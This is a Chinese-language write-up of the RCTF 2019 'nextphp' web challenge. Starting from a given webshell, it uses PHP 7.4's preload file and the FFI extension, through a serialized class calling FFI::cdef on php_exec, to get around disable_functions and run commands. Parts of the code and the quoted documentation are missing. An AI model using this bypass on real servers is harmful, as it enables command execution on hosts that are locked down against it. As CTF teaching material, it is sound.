# RCTF 2019 Web Writeup
## nextphp
题目直接给了一句话木马，于是先 phpinfo 收集一波信息，发现是 PHP 7.4 。
disable_functions:
    set_time_limit,ini_set,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,putenv,error_log,dl
open_basedir:
    /var/www/html
看起来十分严格，于是先读一下 Web 目录下有些啥，发现 preload.php:
     null,
            'func' => 'print_r',
            'arg' => '1'
        ];
        private function run () {
            $this->data['ret'] = $this->data['func']($this->data['arg']);
        }
        public function __serialize(): array {
            return $this->data;
        }
        public function __unserialize(array $data) {
            array_merge($this->data, $data);
            $this->run();
        }
        public function serialize (): string {
            return serialize($this->data);
        }
        public function unserialize($payload) {
            $this->data = unserialize($payload);
            $this->run();
        }
        public function __get ($key) {
            return $this->data[$key];
        }
        public function __set ($key, $value) {
            throw new \Exception('No implemented');
        }
        public function __construct () {
            throw new \Exception('No implemented');
        }
    }
里面定义了一个可以反序列化执行任意函数的类，然而我们已经有了一句话木马，乍看之下好像没有任何作用。
好好想了想，起这个名字一般是预加载的文件，于是尝试在 phpinfo 里搜一下，发现：
    opcache.preload = /var/www/html/preload.php
是没见过的孩子呢， google 一下这个配置：
> 
是 PHP 7.4的新特性，可以利用其在服务器启动时加载一些类和函数，然后就可以在之后如同 PHP 的内部实体一样直接调用，仔细读文档，发现一行：
> In conjunction with ext/FFI (dangerous extension), we may allow FFI
> functionality only in preloaded PHP files, but not in regular ones
dangerous? 同样在 phpinfo 里先搜一下：
    FFI support = enabled
看来是启动了，于是同样去搜一下这是个啥：
> 
看起来可以利用 ffi 直接调用 C 语言编写的函数，且示例里还有：
> 
可以看到在 FFI::cdef 不传第二个参数时，可以直接调用 PHP 源码中的函数，于是我们可以考虑直接调用 PHP 里执行命令的函数：
     null,
            'func' => 'FFI::cdef',
            'arg' => "int php_exec(int type, char *cmd);"
        ];
        public function serialize (): string {
            return serialize($this->data);
        }
        public function unserialize($payload) {
            $this->data = unserialize($payload);
            $this->run();
        }
        public function __construct () {
        }
    }